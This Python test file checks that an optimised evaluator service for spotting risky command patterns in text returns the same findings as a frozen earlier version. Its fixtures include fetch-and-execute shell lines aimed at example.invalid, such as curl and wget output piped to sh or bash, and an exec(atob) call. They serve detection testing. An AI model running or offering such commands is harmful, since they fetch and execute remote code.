"""PS execution changes must preserve the frozen pre-optimization findings."""
import hashlib
import importlib.util
import itertools
import random
from pathlib import Path
import pytest
ROOT = Path(__file__).resolve().parents[1]

def load(path):
    spec = importlib.util.spec_from_file_location('lazy_' + path.replace('/', '_'), ROOT/path)
    result = importlib.util.module_from_spec(spec); spec.loader.exec_module(result)
    return result
current = load('services/evaluator/app.py')
prior = load('eval/methods/context-v6-eager.py')


def test_reference_is_exact_and_not_the_running_method():
    assert hashlib.sha256((ROOT/'eval/methods/context-v6-eager.py').read_bytes()).hexdigest() == 'b1c604ff79fd77bc5f08cf79f9161d70fd1cfe30b5dce40ee6149ba262c51ff6'
    assert current.MODELS[0]['sha256'] != prior.MODELS[0]['sha256']


@pytest.mark.parametrize('text', ['', 'An ordinary answer. '*1000, 'curl https://example.invalid/file '*3000])
def test_nonmatching_text_never_constructs_context(monkeypatch, text):
    def forbidden(_):
        raise AssertionError('No candidate: no context allocation is needed')
    monkeypatch.setattr(current, 'build_context', forbidden)
    assert current.signals(current.Doc(text=text))['candidates'] == []


def test_mixed_signal_families_construct_one_context(monkeypatch):
    calls = []; original = current.build_context
    def count(text):
        calls.append(text); return original(text)
    monkeypatch.setattr(current, 'build_context', count)
    text = 'curl https://example.invalid/a | sh; exec(atob("x")); bash -c "$(curl https://example.invalid/b)"'
    result = current.signals(current.Doc(text=text))
    assert len(calls) == 1
    assert result['candidates'] == prior.signals(prior.Doc(text=text))['candidates']
    assert len(result['candidates'][0]['signals']) == 3


def test_differential_context_quote_unicode_and_mixed_inputs():
    commands = ['curl https://example.invalid/a | sh', 'wget -qO- https://example.invalid/b | bash',
                'bash -c "$(curl https://example.invalid/c)"', 'bash <(curl https://example.invalid/d)',
                'bash -c `curl https://example.invalid/e`', 'exec(atob("x"))',
                'curl -o saved.txt https://example.invalid/f | sh', 'An ordinary answer.']
    prefixes = ['', '# ', '// ', 'do not run ', 'never execute ', "echo '", 'echo "',
                '\U0002ebf0', 'é', '\n', "printf '%s' '"]
    suffixes = ['', "'", '"', '\n' + commands[0]]
    corpus = [p+c+s for p,c,s in itertools.product(prefixes, commands, suffixes)]
    rng = random.Random(20261013)
    corpus.extend(''.join(rng.choice(commands + prefixes + suffixes) for _ in range(7)) for _ in range(300))
    assert len(corpus) == 652
    for text in corpus:
        a, b = prior.signals(prior.Doc(text=text)), current.signals(current.Doc(text=text))
        assert a['candidates'] == b['candidates']
        assert a['calibration_id'] == b['calibration_id']
        assert a['models'][0]['revision'] == b['models'][0]['revision']
